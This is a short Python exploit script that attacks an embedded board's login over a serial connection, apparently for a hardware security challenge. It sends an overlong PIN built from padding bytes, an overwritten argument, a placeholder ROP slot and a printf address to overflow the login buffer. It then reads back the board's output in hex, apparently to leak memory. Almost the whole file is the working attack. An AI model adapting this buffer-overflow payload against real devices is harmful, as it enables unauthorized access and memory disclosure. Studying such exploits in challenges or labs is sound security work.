from tqdm import tqdm
import sys
import serial

arg1 = b'\x08\x07\x06\x04'
# arg1 = 'ZZZZ'
# rop1 = '\xec\x0c\x01\x04\x00\x00\x00\x00'
rop1 = 8*b'C'
printf = b'\x80\xe2\x04\x04'
username = "demo"
pin = 16*b'A' + arg1 + 12*b'B'+ rop1 + printf

username_prompt = "Enter your username: "
pin_prompt = "Enter your PIN: "
mesh_prompt = "mesh> "

ser = serial.Serial("/dev/ttyUSB1", 115200, timeout=1)

# read data from the serial device ser until the first argument is detected
def recv_until(until, ser):
    recv = ser.read(len(until)).decode("utf-8")
    while until not in recv:
        recv = recv + ser.read(1).decode("utf-8")
    return recv

# read data from the serial device ser until either the first or second argument is detected
def recv_until_either(until1, until2, ser):
    recv = ser.read(min(len(until1), len(until2))).decode("utf-8")
    while until1 not in recv and until2 not in recv:
        recv = recv + ser.read(1).decode("utf-8")
    return recv

print("We have reached the initial starting point.")
print("If you are hanging here you might want to restart the board")
recv_until(username_prompt, ser)
print("Starting to brute force logins!")
ser.write((username + "\n").encode("utf-8"))
ser.write((pin + b"\x0a"))
print("starting to read serial")
a = ""
cont = True
while cont:
#    print(str(ser.read(1))), end='')
    value = ser.read(10)
    if(len(value) < 10):
        cont = False
    print(value.hex(), end='')
print()
